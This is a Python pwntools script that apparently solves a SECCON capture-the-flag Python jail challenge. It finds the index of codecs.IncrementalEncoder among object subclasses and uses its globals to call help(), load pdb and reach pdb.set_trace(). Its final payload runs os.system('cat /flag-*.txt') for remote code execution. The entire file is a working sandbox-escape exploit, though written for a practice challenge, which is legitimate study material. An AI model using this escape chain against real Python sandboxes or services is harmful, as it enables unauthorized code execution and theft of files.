import pwn
import os

pwn.context.log_level = "debug"


def connect() -> pwn.remote:
    return pwn.remote(
        os.getenv("SECCON_HOST", "localhost"), os.getenv("SECCON_PORT", "5000")
    )


def find_index() -> int:
    with connect() as io:
        io.sendlineafter(
            b"> ",
            f'"".__class__.__base__.__subclasses__()',
        )
        classes = io.recvline().decode().split(", ")
        for i, c in enumerate(classes):
            if "<class 'codecs.IncrementalEncoder'>" in c:
                return i
        assert False


i = find_index()

with connect() as io:
    # Call `help()`
    io.sendlineafter(
        b"jail> ",
        f'"".__class__.__base__.__subclasses__()[{i}].__init__.__globals__["__builtins__"]["help"]()',
    )
    # Load `pdb` module
    io.sendlineafter(
        b"help> ",
        "pdb",
    )
    # Load `jail` module (This will execute jail.py again!)
    io.sendlineafter(
        b"help> ",
        "jail",
    )
    # Call `pdb.set_trace()`
    io.sendlineafter(
        b"jail> ",
        f'"".__class__.__base__.__subclasses__()[{i}].__init__.__globals__["sys"].modules["pdb"].set_trace()',
    )
    # RCE :)
    io.sendlineafter(
        b"(Pdb) ",
        f'"".__class__.__base__.__subclasses__()[{i}].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat /flag-*.txt")',
    )

    print(io.recvline().decode().strip())
